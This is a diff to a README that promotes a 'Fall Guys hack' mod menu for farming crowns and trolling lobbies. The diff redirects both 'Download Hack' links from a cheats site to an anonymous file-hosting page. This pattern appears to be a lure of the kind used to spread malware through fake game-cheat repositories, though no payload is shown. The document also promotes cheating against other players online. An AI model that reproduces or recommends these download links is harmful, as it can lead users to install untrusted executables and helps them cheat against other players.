@@ -4,7 +4,7 @@ Let’s face it: Fall Guys is fun... until you get grabbed at the finish line or
 
 Whether you're out here to farm crowns, troll the lobby, or just zoom around for fun, this mod turns your bean into a legend 😈
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://wecheaters.github.io/cheats/fall-guys/)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload16.bitbucket.io)
 ---
 
 ## 🧰 What’s in This Fall Guys Hack?
@@ -22,7 +22,7 @@ This isn’t some one-trick cheat. It's a full-featured **mod menu** with hotkey
 
 All features are toggled in-game using `Insert` or `F11` to bring up the clean, non-invasive menu overlay.
 
-[![Download Hack](https://i.ytimg.com/vi/iePLjVmxp0w/maxresdefault.jpg)](https://wecheaters.github.io/cheats/fall-guys/)
+[![Download Hack](https://i.ytimg.com/vi/iePLjVmxp0w/maxresdefault.jpg)](https://fileoffload16.bitbucket.io)
 ---
 
 ## 📊 Why This Hack Is Different
